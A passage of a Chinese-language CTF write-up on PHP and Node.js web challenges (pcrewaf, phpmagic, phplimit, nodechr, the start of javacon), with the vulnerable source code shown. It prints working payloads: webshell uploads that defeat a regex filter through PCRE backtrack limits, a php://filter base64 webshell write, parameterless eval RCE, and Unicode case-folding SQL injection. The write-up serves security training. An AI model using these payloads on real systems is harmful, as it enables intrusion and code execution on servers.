class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">'$a,$b'</span>, <span class="string">'return "ln($a) + ln($b) = " . log($a * $b);'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"New anonymous function: $newfunc\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一行代码等价于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"ln($a) + ln($b) = "</span> . log($a * $b); </span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li><p>本题就可以构造 payload : <code>action=\create_function&amp;arg=return &#39;peri0d&#39;;}var_dump(scandir(&#39;../&#39;));/*</code>，然后 readfile(flag) 即可</p><p>相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'peri0d'</span>;&#125;</span><br><span class="line">var_dump(scandir(<span class="string">'../'</span>)); <span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">)</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="pcrewaf"><a href="#pcrewaf" class="headerlink" title="pcrewaf"></a>pcrewaf</h1><ul><li><p>PCRE 回溯次数限制绕过正则</p></li><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传文件，使用正则判断是否含有 php 代码，正则 <code>/i</code> 不区分大小写，<code>/s</code> 匹配任何不可见字符，包括空格，TAB，换行。</p></li><li><p>如果不含有 php 代码，上传的文件会被保存，并在 http 中重定向到文件路径</p></li><li><p>常见的正则引擎有两种，DFA 和 NFA，php 中的 PCRE 库使用的是 NFA，</p><ul><li>DFA : 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li><li>NFA : 从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li></ul></li><li><p>假设待匹配字符串 <code>&lt;?php phpinfo();//aaaaa</code> 匹配顺序如下图 :</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pcre.png" alt></p></li><li><p>在第四步，由于匹配的是 <code>.*</code> 任意多个字符，所以匹配到最后</p></li><li><p>按照正则，在 <code>.*</code> 后面应该是 <code>[(`;?&gt;]</code> ，显然 <code>//aaaaa</code> 不对，所以依次吐出这几个字符，即回溯，这里总共回溯了 8 次，回溯到 <code>;</code> 时 <code>.*</code> 匹配的是 <code>&lt;?php phpinfo()</code> ，后面的 <code>;</code> 符合 <code>[(`;?&gt;]</code> ，所以匹配 <code>;</code> ，然后正则最后的 <code>.*</code> 匹配到最后</p></li><li><p>php 有一个回溯上限 <code>backtrack_limit</code> ，默认是 1000000。如果回溯上限超过 100 万那么 preg_match 返回 false ，既不是 1 也不是 0 ，这样就可以绕过了</p></li><li><p>对应 poc : </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.233.132:8088/index.php'</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line"><span class="string">'file'</span>: BytesIO(<span class="string">b'&lt;?php eval($_POST[shell]);//'</span> + <span class="string">b'a'</span>*<span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求并禁止重定向</span></span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">print(r.headers)</span><br></pre></td></tr></table></figure></li><li><p>可以获取 shell 位置，连接即可</p></li><li><p>如下一个 waf : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/UNION.+?SELECT/is'</span>, $input)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'SQL Injection'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>输入 <code>UNION/*aaaaa*/SELECT</code> ，这个正则表达式执行流程如下</p><ol><li>正则先匹配 UNION，然后 <code>.+?</code> 匹配 / </li><li>由于是非贪婪匹配，匹配最短字符，所以只匹配到 / 就停止</li><li>接着 <code>S</code> 匹配 * ，匹配失败，回溯，由 <code>.+?</code> 匹配 * ，成功</li><li>重复上一步，直到匹配结束</li></ol></li><li><p>这里也可以利用回溯次数限制绕过正则</p></li><li><p><code>preg_match</code> 返回的是匹配到的次数，如果匹配不到会返回 0 ，如果报错就会返回 false 。所以，对 <code>preg_match</code> 来说，只要对返回结果有判断，就可以避免这样的问题</p></li></ul><h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><ul><li><p>伪协议解码 base64 写入 shell</p></li><li><p>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain)&#123;</span><br><span class="line"> $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line"> $output = shell_exec($command);</span><br><span class="line"> $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line"> $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line"> <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">  file_put_contents($log_name, $output);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">endif</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 获取浏览当前页面的用户的 IP 地址，在 data 下创建文件夹，用于存储 output</p></li><li><p>$domain 和 $log 两个参数可控，$domain 用于 dig 命令，$log 用于将结果写入</p></li><li><p>在 php 中，只要是传 filename 的地方，都可以传协议流</p></li><li><p>思路就是 $log_name 处利用伪协议将 $output 处的字符串 base64 解码写入 webshell</p></li><li><p><code>$_SERVER[&#39;SERVER_NAME&#39;]</code> 获取当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。这个值可以更改，由 HTTP Header 中的 Host 决定。</p></li><li><p><code>pathinfo()</code> 函数过滤后缀名，但是，只要在后缀名后加上 <code>/.</code> ，它就获取不到后缀名了，且可以正常写入 <code>.php</code> 之中。php 在处理路径的时候，会递归删除掉路径中存在的 <code>/.</code> </p></li><li><p>php 伪协议 base64 解码中，如果遇到不合规范的字符就直接跳过。base64 解码是按照 4 位解的，所以要只有传入 4 的倍数位字符串才能解码为正常字符串，且传入的 base64 不能以 <code>==</code> 结尾，<code>==</code> 出现在 base64 中间不符合规则，可能会无法解析</p></li><li><p>payload : </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span></span><br><span class="line"><span class="attribute">Host</span>: php</span><br><span class="line"></span><br><span class="line">domain=YWFhYTw/cGhwIGV2YWwoJF9QT1NUWydzaGVsbCddKTsgLy8q&amp;log=://filter/write=convert.base64-decode/resource=/var/www/html/data/daa6b8b28b2eda419112a887399ce9fc/shell.php/.</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/phpmagic_1.PNG" alt></p></li><li><p>结果 : </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/phpmagic_2.PNG" alt></p></li></ul><h1 id="phplimit"><a href="#phplimit" class="headerlink" title="phplimit"></a>phplimit</h1><ul><li><p>无参 RCE</p></li><li><p>代码如下 : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ciscn 2019 和 rctf 2018 的题目，统计一下这一题的解法，主要是 get_defined_vars() 和 session_id() 两个函数</p></li><li><p><code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code>，<code>\W</code> 匹配任意字母和数字，<code>(?R)?</code> 重复整个模式，<code>?R</code> 是 php 中的一种<a href="https://php.net/manual/zh/regexp.reference.recursive.php" target="_blank" rel="noopener">递归模式</a>，合在一起类似于匹配 <code>x(y(z()))</code> 样式的，且不能存在参数，输入 <code>?code=phpinfo();</code> 可以查看 phpinfo 页面</p></li><li><p>在 rctf 2018 的题目中使用的是 apache 的容器，在本题使用 nginx 容器，都是考虑通过修改请求头信息来实现 RCE</p></li><li><p>在 apache 中可以使用 <code>getallheaders()</code> 获取所有头信息，而在 nginx 中可以使用 <code>get_defined_vars()</code> 函数获取所有已定义的变量列表，然后就可以通过位置函数来操控数组</p></li><li><p><code>session_id()</code> 可以获取 PHPSESSID，虽然 PHPSESSID 只允许字母数字和下划线出现，<code>hex2bin</code> 转换一下编码即可</p></li><li><p>几个 payload :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一个</span></span><br><span class="line">?code=<span class="keyword">eval</span>(hex2bin(session_id(session_start())));  <span class="comment">// echo 'peri0d';</span></span><br><span class="line">Cookie: PHPSESSID=<span class="number">6563686</span>f2027706572693064273b</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二个</span></span><br><span class="line">?code=<span class="keyword">eval</span>(end(current(get_defined_vars())));&amp;a=var_dump(scandir(<span class="string">'../'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//第三个</span></span><br><span class="line">?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></li></ul><h1 id="nodechr"><a href="#nodechr" class="headerlink" title="nodechr"></a>nodechr</h1><ul><li><p>js 的题目，关于 javascript 的大小写特性，两个函数 toLowerCase() 和 toLowerCase() </p></li><li><p>代码如下 : </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// initial libraries</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>)</span><br><span class="line"><span class="keyword">const</span> sqlite = <span class="built_in">require</span>(<span class="string">'sqlite'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>)</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)</span><br><span class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">'koa-send'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>)</span><br><span class="line"><span class="keyword">const</span> isString = <span class="built_in">require</span>(<span class="string">'underscore'</span>).isString</span><br><span class="line"><span class="keyword">const</span> basename = <span class="built_in">require</span>(<span class="string">'path'</span>).basename</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">JSON</span>.parse(fs.readFileSync(<span class="string">'../config.json'</span>, &#123;<span class="attr">encoding</span>: <span class="string">'utf-8'</span>, <span class="attr">flag</span>: <span class="string">'r'</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> app = <span class="keyword">new</span> Koa()</span><br><span class="line">    <span class="keyword">const</span> router = <span class="keyword">new</span> Router()</span><br><span class="line">    <span class="keyword">const</span> db = <span class="keyword">await</span> sqlite.open(<span class="string">':memory:'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."users" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "username" TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        "password" TEXT,</span></span><br><span class="line"><span class="string">        CONSTRAINT "unique_username" UNIQUE ("username")</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."flags" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "flag" TEXT NOT NULL</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> user <span class="keyword">of</span> config.users) &#123;</span><br><span class="line">        <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "users"("username", "password") VALUES ('<span class="subst">$&#123;user.username&#125;</span>', '<span class="subst">$&#123;user.password&#125;</span>')`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "flags"("flag") VALUES ('<span class="subst">$&#123;config.flag&#125;</span>')`</span>)</span><br><span class="line"></span><br><span class="line">    router.all(<span class="string">'login'</span>, <span class="string">'/login/'</span>, login).get(<span class="string">'admin'</span>, <span class="string">'/'</span>, admin).get(<span class="string">'static'</span>, <span class="string">'/static/:path(.+)'</span>, <span class="keyword">static</span>).get(<span class="string">'/source'</span>, source)</span><br><span class="line"></span><br><span class="line">    app.use(views(__dirname + <span class="string">'/views'</span>, &#123;</span><br><span class="line">        map: &#123;</span><br><span class="line">            html: <span class="string">'underscore'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        extension: <span class="string">'html'</span></span><br><span class="line">    &#125;)).use(bodyParser()).use(session(app))</span><br><span class="line">    </span><br><span class="line">    app.use(router.routes()).use(router.allowedMethods());</span><br><span class="line">    </span><br><span class="line">    app.keys = config.signed</span><br><span class="line">    app.context.db = db</span><br><span class="line">    app.context.router = router</span><br><span class="line">    app.listen(<span class="number">3000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">static</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, ctx.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">admin</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ctx.session.user) &#123;</span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        <span class="keyword">return</span> ctx.redirect(ctx.router.url(<span class="string">'login'</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ctx.render(<span class="string">'admin'</span>, &#123;</span><br><span class="line">        <span class="string">'user'</span>: ctx.session.user</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, basename(__filename))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></li><li><p>关键代码在于 safeKeyword() 函数，过滤了 union 和 select</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>p 牛在<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">博客</a>中提到过如下特性，但是也适用于 python 中，这样就可以绕过保护函数，达到注入的目的</p><blockquote><p>“ ı “.toUpperCase() == ‘ I ‘</p><p>“ ſ “.toUpperCase() == ‘ S ‘</p><p>“ K “.toLowerCase() == ‘ k ‘</p></blockquote></li><li><p>payload : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">username=peri0d&amp;password=<span class="string">' un%C4%B1on %C5%BFelect 1,(%C5%BFelect flag from flags),3'</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="javacon"><a href="#javacon" class="headerlink" title="javacon"></a>javacon</h1><ul><li><p>EI 表达式注入，<a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">http://rui0.cn/archives/1043</a></p></li><li><p>基础知识</p><ul><li><a href="https://peri0d.xyz/2019/09/10/SpEL%20%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">SpEL 注入</a></li><li><a href="https://peri0d.xyz/2019/09/10/Java%20%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">Java 反射机制</a></li><li><a href="https://peri0d.xyz/2019/09/10/%E5%8F%8D%E5%BC%B9%20shell/" target="_blank" rel="noopener">Linux 反弹 shell</a></li></ul></li><li><p>目录结构如下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/javacon_1.PNG" alt></p></li><li><p>SpringBoot 框架，看了一下 Spring 表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">        <span class="comment">//构造上下文：准备比如变量定义等等表达式运行需要的上下文数据 </span></span><br><span class="line">        EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(); </span><br><span class="line">        <span class="comment">//创建解析器：提供SpelExpressionParser默认实现 </span></span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser(); </span><br><span 